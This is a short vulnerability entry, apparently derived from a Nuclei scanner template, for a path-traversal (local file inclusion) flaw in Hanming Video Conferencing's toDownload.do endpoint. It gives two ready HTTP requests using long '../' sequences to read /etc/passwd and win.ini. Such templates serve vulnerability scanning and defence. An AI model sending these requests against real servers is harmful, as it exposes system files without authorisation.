# Nuclei Template: Hanming Video Conferencing - Local File Inclusion
**Template ID:** hanming-lfr
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`hanming-lfr.yaml`)

## Vulnerability Information & PoC

## Description
Hanming Video Conferencing is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini
GET {{BaseURL}}/register/toDownload.do?fileName=../../../../../../../../../../../../../../etc/passwd
```

## References
- https://mp.weixin.qq.com/s/F-M21PT0xn9QOuwoC8llKA
